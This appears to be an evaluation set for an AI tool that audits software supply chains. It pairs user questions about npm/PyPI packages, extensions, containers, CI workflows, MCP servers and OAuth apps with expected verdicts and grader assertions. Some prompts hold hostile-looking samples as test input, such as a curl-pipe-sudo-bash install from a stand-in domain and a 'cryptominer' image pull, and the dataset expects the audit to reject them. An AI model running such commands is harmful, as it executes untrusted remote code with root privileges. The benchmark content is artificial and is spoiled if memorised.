evals.prompt: I want to install express for my Node.js project — npm install express. Is it safe?
evals.expected_output: Quick/Tier 1 audit. Should recognize express as high-trust (massive downloads, verified publisher), run a brief check, and produce a short APPROVED report without excessive ceremony.

assertions.text: Report identifies this as a Tier 1 / Quick audit
Report is saved to a .md file

evals.prompt: Is the Wappalyzer browser extension safe to add to Chrome? I want to use it to identify what tech stack websites are using.
evals.expected_output: Standard/Tier 2 audit. Routes to browser-extension workflow. Should analyze manifest permissions (broad URL access via host_permissions), note Wappalyzer is a known company/tool with CWS Featured status, and produce CONDITIONAL or APPROVED with permission caveats.

assertions.text: Report discusses browser extension permissions (broad URL access)
Verdict is APPROVED or CONDITIONAL (not REJECTED)
Report identifies Wappalyzer as a known company/tool
Report is saved to a .md file

evals.prompt: My coworker shared this package in Slack — npm install react-native-community-async-storage. Should I use it for my React Native app?
evals.expected_output: Deep/Tier 3 audit. Should detect typosquat of @react-native-async-storage/async-storage, flag Slack source, and produce REJECTED or CONDITIONAL with strong warnings.

assertions.text: Report flags potential typosquatting or name mismatch
Report notes Slack source as lower trust
Verdict is REJECTED or CONDITIONAL with strong warnings

evals.prompt: Can I npm install expresss for my web server? I need an HTTP framework.
evals.expected_output: Should detect 'expresss' (triple s) as distance-1 from 'express' (mega-popular package). typosquat-check.ps1 should flag high/critical risk. Verdict should be REJECTED or CONDITIONAL with strong typosquat warning. Report should reference the algorithmic similarity check.

assertions.text: Report mentions typosquat or similarity detection via algorithmic check or typosquat-check script
Report identifies 'express' as the likely intended package

evals.prompt: I'd like to npm install chalk for colorizing my CLI output. Is it safe?
evals.expected_output: chalk is a legitimate, widely-used package. typosquat-check.ps1 should show low risk. Verdict should be APPROVED or CONDITIONAL (not REJECTED). The typosquat check should be mentioned as having been run, but it should not raise false-positive concerns that block approval. This tests false-positive calibration.

assertions.text: Report mentions that typosquat or similarity check was performed
Verdict is APPROVED or CONDITIONAL (not REJECTED)
Report does not incorrectly flag chalk as a typosquat

evals.prompt: I want to npm install lodash@4.17.20 for my Node.js project. Is it safe to use this specific version?
evals.expected_output: Should detect known prototype-pollution CVEs in lodash 4.17.20. Must run structured CVE lookup (vuln-lookup.ps1). Report cites CVE IDs sourced from OSV or GHSA. Verdict CONDITIONAL (upgrade to patched version) or REJECTED. Audit Coverage CVE row names the databases checked.

assertions.text: Report references structured CVE database query (OSV or GHSA or vuln-lookup)
CVE row in Audit Coverage cites which databases were checked
Report cites at least one CVE ID (CVE-YYYY-NNNNN or GHSA-xxx)
Report is saved to a .md file

evals.prompt: Should I pip install requests for making HTTP calls in my Python script?
evals.expected_output: Tier 1 or Tier 2 audit. 'requests' is a widely-used PyPI package. vuln-lookup.ps1 will find medium-severity CVEs (security/redirect/credential exposure advisories); CVE coverage row must cite structured DB check with findings. Verdict CONDITIONAL due to CVEs. First PyPI eval case (partial M2.5 coverage). Note: plan assumed 'none found' for requests but OSV/GHSA have 13 medium CVEs — assertions updated to reflect actual DB state.

assertions.text: CVE coverage row mentions structured DB sources (OSV or GHSA or vuln-lookup)
CVE row references CVE findings or vulnerability database results
Verdict is CONDITIONAL or APPROVED (not REJECTED)
Report identifies this as a PyPI or pip package
Report is saved to a .md file

evals.prompt: I want to use npm install mkdirp@0.5.1 in my build scripts. Is it safe?
evals.expected_output: Tier 2 or Tier 3 audit. mkdirp@0.5.1 itself has no direct CVEs but depends directly on minimist@0.0.8 which has CVE-2020-7598 (prototype pollution). dep-scan.ps1 should flag the minimist dep with HIGH riskLevel (directDepCount: 1, findings containing minimist). vuln-lookup.ps1 should return clean for mkdirp itself. Verdict CONDITIONAL with dep CVE cited in report. Transitive dependencies row references dep-scan.ps1 output.

assertions.text: dep-scan.ps1 invoked OR transitive/dependency scan explicitly performed
minimist or CVE-2020-7598 or prototype pollution mentioned as a dependency vulnerability

evals.prompt: Can I npm install chalk@5.3.0 for terminal color output in my CLI tool?
evals.expected_output: Tier 1 or Tier 2 audit. chalk@5.3.0 is a well-maintained package with zero direct dependencies. dep-scan.ps1 Tier 2 should run and return riskLevel: none (directDepCount: 0). Verdict APPROVED. Verifies dep-scan T2 path runs on a zero-dependency package and returns clean without false positives.

assertions.text: Report does not flag false transitive vulnerabilities for chalk

evals.prompt: A coworker shared this Chrome extension link in Slack: 'YouTube Video Downloader Pro'. Should I install it?
evals.expected_output: Tier 3 deep audit. Should flag: video downloaders are frequently policy-violating (CWS bans YouTube downloaders), shared via Slack (not discovered organically), likely requests broad permissions. Verdict should be REJECTED or CONDITIONAL with strong warnings.

assertions.text: Report flags the Slack source or direct sharing as risk

evals.prompt: Is uBlock Origin safe to install on Firefox? I want an ad blocker.
evals.expected_output: Tier 1 quick audit. Should recognize uBlock Origin as a well-known open-source ad blocker with AMO Recommended badge. Should note broad permissions are expected for an ad blocker (declarativeNetRequest/webRequest + broad host access). Verdict APPROVED.

assertions.text: Report identifies uBlock Origin as well-known or trusted
Report notes permissions are expected for an ad blocker
Report is saved to a .md file

evals.prompt: A blog post told me to pip install requers for making HTTP calls in my Python script, but I expected the popular requests package. Is it safe?
evals.expected_output: Deep/Tier 3 audit. `requers` is a real PyPI project as of 2026-04-12, but the user context explicitly expects `requests`, and `requers` markets itself as a requests-like HTTP client. The audit should treat this as a likely name-confusion / typosquat-style risk in PyPI context, use manual or canonical name verification rather than npm-only `typosquat-check.ps1`, call out `requests` as the likely intended package, and return REJECTED or strong CONDITIONAL with clear caution. Audit Coverage should still include `## Audit Coverage` and `Audit confidence`.

assertions.text: Report identifies this as a PyPI or pip package
Report identifies requests as the likely intended package
Report mentions manual or canonical name verification rather than npm-only typosquat-check.ps1
Verdict is REJECTED or CONDITIONAL with strong warnings

evals.prompt: I want to run a web server in a container — docker pull nginx:latest. Is this safe to use in production?
evals.expected_output: Standard/Tier 2 audit. Routes to container-image workflow. `nginx` is a Docker Official Image (strong publisher signal), but the user is pulling the `:latest` tag with no digest pin. Audit should flag the `:latest` + no-digest-pin pattern, recommend pinning to a specific digest (`nginx@sha256:<hex>`) or an immutable tag (`nginx:1.27.3-alpine`), note that Docker Official Images don't ship Cosign signatures by default (acceptable gap on Official image; flag if org policy requires signed images), and check for known critical CVEs in the current nginx tag. Verdict should be CONDITIONAL (approved with the pinning + signature-policy conditions met).

assertions.text: Report flags :latest tag or lack of digest pinning
Report identifies nginx as a Docker Official Image or well-known publisher
Report recommends pinning to a specific digest or immutable tag
Verdict is CONDITIONAL or APPROVED (not REJECTED)

evals.prompt: A tutorial I found says to run docker pull someunknownregistry.io/cryptominer:latest for a 'mining benchmark tool'. Should I use it?
evals.expected_output: Deep/Tier 3 audit. Routes to container-image workflow. Multiple CRITICAL red flags: unknown registry (no publisher identity, no verification), `:latest` with no digest pin, suspicious image name (`cryptominer`) that strongly suggests malicious intent, no signing, no SBOM, likely high-privilege runtime requirements. Verdict must be REJECTED. Report should flag the unknown registry, the suspicious naming pattern, and the combination as equivalent to a known malware pattern in container supply chains.

assertions.text: Report flags the unknown or untrusted registry
Report flags the suspicious image name (cryptominer) as a malicious-intent signal
Report flags :latest tag or lack of digest pinning

evals.prompt: Our workflow uses `actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683` on `pull_request` with `permissions: contents: read` and no extra secrets. Is this safe?
evals.expected_output: Tier 1 quick audit. Routes to ci-action workflow. Should recognize `actions/checkout` as an official `actions/*` action, note the full commit-SHA pin, note the read-only permission scope and lack of `pull_request_target` / inherited-secrets exposure, and return APPROVED.

assertions.text: Report identifies `actions/checkout` as official or trusted
Report notes the action is pinned to a full commit SHA
Report notes the workflow uses read-only permissions or no dangerous secret exposure

evals.prompt:
Can I use this reusable workflow from another org?

```yaml
on: pull_request_target
jobs:
  release:
    permissions:
      contents: write
      pull-requests: write
    uses: vendor/release-workflow/.github/workflows/publish.yml@v2
    secrets: inherit
```

I checked the reusable workflow and it calls `third-party/build-action@main`.
evals.expected_output: Tier 3 deep audit. Routes to ci-action workflow. Should flag `pull_request_target`, inherited secrets, write-capable permissions, top-level tag pin instead of full SHA, and the transitive child action pinned to `main`. Verdict must be REJECTED.

assertions.text: Report flags `pull_request_target` as high-risk or dangerous
Report flags inherited secrets or privileged token scope
Report flags the top-level ref or transitive child as not SHA pinned
Report audits the nested or transitive action

evals.prompt: Is the Prettier VS Code extension safe to install? I want to use it for code formatting. The extension is published by 'Prettier' on the VS Code Marketplace.
evals.expected_output: Tier 1 quick audit. Routes to ide-plugin workflow. Should recognize Prettier as a well-known open-source project with a verified publisher on VS Code Marketplace, note the high install count (tens of millions), confirm capabilities are proportional (formatting commands, language support), and return APPROVED.

assertions.text: Report identifies Prettier as a known project or verified publisher
Report notes high install count or widespread adoption
Report notes capabilities are proportional to stated purpose (formatting)

evals.prompt: A colleague sent me a .vsix file called 'super-intellisense-pro.vsix' over Slack. They said it makes autocomplete way better. Should I install it?
evals.expected_output: Tier 3 deep audit. Routes to ide-plugin workflow. Should flag the sideloaded distribution (no marketplace listing), Slack-shared provenance, unknown publisher, inability to verify capabilities or binary contents without manual VSIX inspection. Verdict must be REJECTED.

assertions.text: Report flags sideloaded or non-marketplace distribution as high risk
Report flags unknown publisher or unverifiable provenance
Report flags Slack-shared or direct-file distribution

evals.prompt: Is it safe to install Firefox via winget? I want to run: winget install Mozilla.Firefox
evals.expected_output: Tier 1 quick audit. Routes to desktop-app workflow. Should recognize Firefox as a well-known open-source browser from Mozilla (established vendor), note winget as a recognized distribution channel with community-reviewed manifest, confirm the app is code-signed (Authenticode), and return APPROVED.

assertions.text: Report identifies Mozilla/Firefox as a known vendor or project
Report notes winget as a recognized distribution channel

evals.prompt: A forum post linked to a site called free-software-downloads.xyz where I can get a 'Pro' version of VLC media player as a .exe file. Should I install it?
evals.expected_output: Tier 3 deep audit. Routes to desktop-app workflow. Should flag the third-party mirror (not VideoLAN's official site), the repackaged 'Pro' branding (VLC is free/open-source — there is no Pro version), the .exe installer from an unknown source, and the forum-link distribution. Verdict must be REJECTED.

assertions.text: Report flags the third-party or unofficial download source
Report flags the repackaged or fake 'Pro' version as suspicious
Report flags the .exe installer from unknown source

evals.prompt: I want to install ripgrep. Is it safe? I'd run: brew install ripgrep
evals.expected_output: Tier 1 quick audit. Routes to cli-binary workflow. Should recognize ripgrep (rg) as a well-known open-source search tool by BurntSushi (Andrew Gallant), distributed via Homebrew core formula with build-from-source option, also available on GitHub Releases with checksums. Rust-based, actively maintained, broad adoption. Verdict should be APPROVED.

assertions.text: Report identifies ripgrep as a well-known or established project
Report notes Homebrew core formula as distribution channel
Report discusses checksum or signature availability

evals.prompt: A blog post says to run this to install a cool productivity tool: curl -sSL https://totally-legit-tools.xyz/install.sh | sudo bash — should I?
evals.expected_output: Tier 3 deep audit. Routes to cli-binary workflow. Should flag multiple critical risks: curl-pipe-sudo-bash is the most dangerous install pattern, unknown domain (totally-legit-tools.xyz), elevated privileges via sudo, no checksum or signature verification, blog-post distribution channel. Verdict must be REJECTED.

assertions.text: Report flags curl-pipe-bash or pipe-to-shell as high risk
Report flags sudo or elevated privileges
Report flags unknown or unverifiable source

evals.prompt: Is it safe to use the Anthropic-maintained MCP filesystem server? I'd configure it in my .mcp.json like: { "mcpServers": { "filesystem": { "command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem", "/Users/me/projects"] } } }
evals.expected_output: Tier 1 quick audit. Routes to agent-extension workflow, sub-rubric 8a (MCP server). Should recognize @modelcontextprotocol/server-filesystem as an Anthropic-maintained official MCP server, distributed via npm under the @modelcontextprotocol scope. stdio transport (local, process-isolated). Capabilities: file-system read/write scoped to the specified directory argument. Should note that while fs-write is generally a High-risk capability, the directory scoping plus Anthropic-official provenance mitigates significantly. Verdict should be APPROVED with a note about directory scope.

assertions.text: Report identifies Anthropic or @modelcontextprotocol as the official publisher
Report notes directory scoping as a mitigation

evals.prompt: Someone on Discord shared an MCP server config for a 'universal AI assistant' tool: { "mcpServers": { "universal-ai": { "command": "npx", "args": ["-y", "universal-ai-mcp-server"], "env": { "OPENAI_API_KEY": "...", "ANTHROPIC_API_KEY": "..." } } } } — the GitHub repo (github.com/randomuser42/universal-ai-mcp) has 3 stars and was created last week. Should I add this?
evals.expected_output: Tier 3 deep audit. Routes to agent-extension workflow, sub-rubric 8a (MCP server). Should flag multiple critical risks: unknown publisher (randomuser42), brand-new repo (created last week, 3 stars), Discord-shared provenance (no registry gate), requires API keys in env (credential exposure — CRITICAL capability), unknown capability surface (cannot verify what tools are exposed without inspection), npx execution of unvetted package. Should flag the API key requirement as a critical credential-theft vector. Verdict must be REJECTED.

assertions.text: Report flags unknown or unverified publisher
Report flags the new/low-star GitHub repo
Report flags API key or credential exposure as critical risk
Report flags Discord or social-media shared provenance

evals.prompt: Our team wants to add the official Slack app to our workspace for notifications. The admin would install it from the Slack App Directory at https://slack.com/apps — it requests these OAuth scopes: channels:read, chat:write, users:read. Is this integration safe?
evals.expected_output: Tier 1 quick audit. Routes to remote-integration workflow. Should recognize the official Slack app installed via Slack App Directory (verified marketplace) as a first-party integration from Slack (Salesforce). Scopes are minimal and appropriate: channels:read (list channels), chat:write (post messages), users:read (list users) — all read-only or write-only-to-own-messages, no admin scopes, no offline_access. Slack is a well-known vendor with SOC2 Type II, ISO 27001, published DPA, and transparent data practices. No disqualifying breach history. Verdict should be APPROVED.

assertions.text: Report identifies Slack as an established or well-known vendor
Report notes Slack App Directory as official marketplace
Report discusses OAuth scopes and least privilege
Report mentions compliance certifications or SOC2

evals.prompt: I got an email saying I should connect this productivity app to my Google Workspace — it's at https://superproductivity-ai.xyz/connect and asks for these Google OAuth scopes: https://www.googleapis.com/auth/gmail.readonly, https://www.googleapis.com/auth/drive, https://www.googleapis.com/auth/admin.directory.user, https://www.googleapis.com/auth/calendar. The company is 'SuperProductivity AI' and I can't find much about them online. Should I authorize this?
evals.expected_output: Tier 3 deep audit. Routes to remote-integration workflow. Should flag multiple critical risks: unknown vendor ('SuperProductivity AI' with no discoverable online presence), suspicious domain (superproductivity-ai.xyz — non-standard TLD, not an established vendor domain), email-distributed authorization link (potential phishing vector — not from Google Workspace Marketplace), grossly overprivileged scopes (full Gmail read, full Drive access, admin directory user management, full calendar access — requests admin scope without justification), no compliance documentation discoverable, no marketplace verification. The combination of email distribution + unknown vendor + broad scopes including admin access is a strong phishing/credential-harvesting signal. Verdict should be REJECTED.

assertions.text: Report flags unknown vendor or unverifiable publisher
Report flags overprivileged or excessive OAuth scopes
Report flags email distribution or phishing risk
Report flags admin scope or admin.directory access
